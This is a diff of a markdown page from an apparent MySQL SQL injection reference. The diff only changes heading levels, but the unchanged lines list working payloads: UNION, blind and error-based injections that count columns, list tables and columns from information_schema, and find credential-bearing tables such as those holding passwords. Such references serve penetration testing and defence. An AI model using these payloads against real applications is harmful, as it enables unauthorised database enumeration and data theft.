@@ -7,15 +7,13 @@ tags: ["schema", "tables", "columns", "enumeration"]
 lastUpdated: 2025-12-16
 ---
 
-## Tables and Columns
-
 Discovering table and column information is a critical step in SQL injection attacks. This information helps map the database structure for targeted data extraction.
 
-### Determining Number of Columns
+## Determining Number of Columns
 
 There are several methods to determine the number of columns in a query:
 
-#### Using ORDER BY or GROUP BY
+### Using ORDER BY or GROUP BY
 
 ```sql
 -- Keep incrementing n until you get an error
@@ -34,7 +32,7 @@ GROUP BY n
 -1' UNION SELECT 1,2,3--+ -- True (Success)
 ```
 
-#### Using GROUP BY with Error-based Method
+### Using GROUP BY with Error-based Method
 
 ```sql
 -- Will show the column number in the error
@@ -49,7 +47,7 @@ GROUP BY n
 1' ORDER BY 1,2,3,4,5--+  -- Error: "Unknown column '4' in 'order clause'"
 ```
 
-#### Using INTO Variables
+### Using INTO Variables
 
 ```sql
 -- Useful for finding columns after a LIMIT clause
@@ -65,7 +63,7 @@ GROUP BY n
 -1 UNION SELECT 1 INTO @      -- No error means query uses 1 column
 ```
 
-#### Using Subquery Comparison
+### Using Subquery Comparison
 
 ```sql
 -- Shows number of columns in the table (not query)
@@ -78,9 +76,9 @@ AND (SELECT * FROM SOME_EXISTING_TABLE) = 1
 1 AND (SELECT * FROM Users) = 1  -- Error: "Operand should contain 3 column(s)"
 ```
 
-### Retrieving Tables
+## Retrieving Tables
 
-#### Using UNION
+### Using UNION
 
 ```sql
 -- Filter by current database and table type
@@ -92,14 +90,14 @@ UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table
 
 **Note:** Use `TABLE_TYPE='BASE TABLE'` to filter for user-created tables (excludes views and system tables). Filter by `TABLE_SCHEMA` to exclude system databases. The `VERSION` column is not useful for filtering: in MySQL 5.7 it reflected .frm file version, and in MySQL 8.0+ it always returns a hardcoded value of 10.
 
-#### Using Blind Injection
+### Using Blind Injection
 
 ```sql
 -- Basic character comparison (subquery must be wrapped in parentheses)
 AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1) > 'A'
 ```
 
-#### Using Error-based Techniques
+### Using Error-based Techniques
 
 ```sql
 AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2)))
@@ -111,22 +109,22 @@ AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY 
 AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));
 ```
 
-### Retrieving Columns
+## Retrieving Columns
 
-#### Using UNION
+### Using UNION
 
 ```sql
 UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
 ```
 
-#### Using Blind Injection
+### Using Blind Injection
 
 ```sql
 -- Basic character comparison (subquery must be wrapped in parentheses)
 AND (SELECT SUBSTR(column_name,1,1) FROM information_schema.columns WHERE table_schema=database() LIMIT 1) > 'A'
 ```
 
-#### Using PROCEDURE ANALYSE() (Legacy)
+### Using PROCEDURE ANALYSE() (Legacy)
 
 _Note: Deprecated in MySQL 5.7, removed in MySQL 8.0._
 
@@ -140,7 +138,7 @@ This technique can automatically extract column information when a query's outpu
 
 It requires that one of the selected columns in the injection point is displayed by the application. This is useful when `UNION` is filtered or unavailable.
 
-### Find Tables by Column Name
+## Find Tables by Column Name
 
 When looking for specific data like usernames or passwords:
 
@@ -152,7 +150,7 @@ SELECT table_name FROM information_schema.columns WHERE column_name = 'username'
 SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';
 ```
 
-### Current Query Inspection
+## Current Query Inspection
 
 Available in MySQL 5.1.7+, you can view the currently executing query:
 
@@ -169,7 +167,7 @@ SELECT info FROM performance_schema.processlist;
 
 This can reveal the full query structure including parts you cannot see in the application response.
 
-### Alternative information_schema Views
+## Alternative information_schema Views
 
 When `information_schema.tables` or `information_schema.columns` are blocked:
 
@@ -180,7 +178,7 @@ When `information_schema.tables` or `information_schema.columns` are blocked:
 | `information_schema.key_column_usage`  | Yes                  |
 | `information_schema.table_constraints` | Yes                  |
 
-### Retrieving Multiple Databases at Once
+## Retrieving Multiple Databases at Once
 
 This advanced payload retrieves all databases, tables, and columns in a single query:
 
